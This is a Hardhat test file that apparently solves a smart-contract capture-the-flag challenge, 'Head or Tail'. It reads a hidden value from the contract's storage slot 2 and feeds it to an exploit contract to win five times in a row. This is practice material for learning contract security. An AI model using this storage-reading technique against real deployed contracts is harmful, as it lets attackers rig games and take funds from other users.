const { ethers } = require("hardhat");
const { expect } = require("chai");
const challengeName = "Head or Tail Challenge";

describe(challengeName, function () {
  let alice, bob;

  before(async function () {
    /** SETUP SCENARIO - DON'T CHANGE ANYTHING HERE */
    [alice, bob] = await ethers.getSigners();

    const HeadOrTale = await ethers.getContractFactory("HeadOrTail", alice);

    this.headOrTale = await HeadOrTale.deploy();

    expect(await this.headOrTale.wins()).to.equal(0);
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE  */
    // retrieving Factor from contract bytecode memory storage and invoking attack function 5 times
    const HeadOrTailExploit = await ethers.getContractFactory("HeadOrTailExploit", alice);

    this.exploit = await HeadOrTailExploit.deploy();

    let factor = ethers.provider.getStorageAt(this.headOrTale.address, 2);
    for(i = 0; i < 5; i++) {
      await this.exploit.connect(bob).attack(this.headOrTale.address, factor);
    }
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Bob has won 5 times in a row
    if (expect(await this.headOrTale.wins()).to.equal(5)) {
      console.log(`You have passed the ${challengeName}.`);
    }
  });
});
